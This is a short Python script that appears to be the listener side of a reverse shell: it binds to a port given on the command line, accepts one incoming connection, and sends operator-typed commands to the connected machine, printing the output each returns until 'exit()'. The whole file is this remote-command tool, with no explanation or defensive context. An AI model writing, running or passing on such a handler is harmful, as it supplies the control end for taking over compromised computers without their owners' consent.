import socket
import subprocess as sp
import sys

host = sys.argv[1]
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
print("Listening on port", port)
conn, addr = s.accept()
print("Got connection from", addr)

while True:
    command = input("#> ")
    if command != "exit()":
        if command == "":
            continue
        conn.send(command.encode())
        result = conn.recv(4096).decode()
        print(result, end="")
    else:
        conn.send(b"exit()")
        print("\nConnection closed")
        break

conn.close()
s.close()
